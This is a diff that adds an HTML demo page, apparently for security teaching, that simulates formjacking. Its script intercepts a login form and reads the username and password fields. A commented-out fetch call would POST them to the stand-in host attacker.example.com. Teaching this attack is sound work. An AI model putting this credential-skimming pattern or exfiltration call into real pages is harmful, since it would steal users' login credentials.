@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Data Exfiltration on Sensitive Fields</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      margin: 50px;
+    }
+    input[type="text"], input[type="password"] {
+      padding: 8px;
+      width: 300px;
+      margin-bottom: 10px;
+      display: block;
+    }
+    button {
+      padding: 10px 20px;
+      background-color: #dc3545;
+      color: white;
+      border: none;
+      font-size: 16px;
+    }
+    #log {
+      margin-top: 20px;
+      background: #f8f9fa;
+      border: 1px solid #ccc;
+      padding: 10px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <h2>Data Exfiltration Test</h2>
+  <p><strong>Vulnerability Explanation:</strong><br>
+This page simulates a vulnerable environment where <strong>malicious JavaScript is able to access and exfiltrate sensitive input field data</strong>, such as usernames and passwords. When the user submits the login form, a script intercepts the form submission, reads the values from the username and password fields, and displays them on the page. In a real-world scenario, this data could be silently sent to an attacker-controlled server.
+</p>
+
+<p><strong>How the vulnerability works:</strong><br>
+- The login form does not implement any protection mechanisms such as input sanitization, content security policy (CSP), or script integrity checking.<br>
+- JavaScript has unrestricted access to DOM elements, including sensitive fields.<br>
+- The script listens for the form submission event, prevents the default behavior, and programmatically reads the user input.<br>
+- The sensitive data is then used or transmitted (simulated here by printing it on the page, but could be exfiltrated via network request).<br>
+- This demonstrates a classic data exfiltration risk often used in attacks such as <em>formjacking</em> or <em>credential harvesting</em>.
+</p>
+
+  <form id="loginForm">
+    <input type="text" id="username" name="username" placeholder="Username">
+    <input type="password" id="password" name="password" placeholder="Password">
+    <button type="submit">Login</button>
+  </form>
+
+  <div id="log">Exfiltrated data will appear here.</div>
+
+  <script>
+    // Simulated malicious script injected into page
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const user = document.getElementById('username').value;
+      const pass = document.getElementById('password').value;
+
+      // Simulate exfiltration (e.g., to an attacker's server)
+      const exfilData = `Exfiltrated → Username: ${user}, Password: ${pass}`;
+      document.getElementById('log').textContent = exfilData;
+
+      // Uncomment below to simulate sending data to remote endpoint
+      // fetch('https://attacker.example.com/collect', {
+      //   method: 'POST',
+      //   headers: { 'Content-Type': 'application/json' },
+      //   body: JSON.stringify({ username: user, password: pass })
+      // });
+    });
+  </script>
+</body>
+</html>
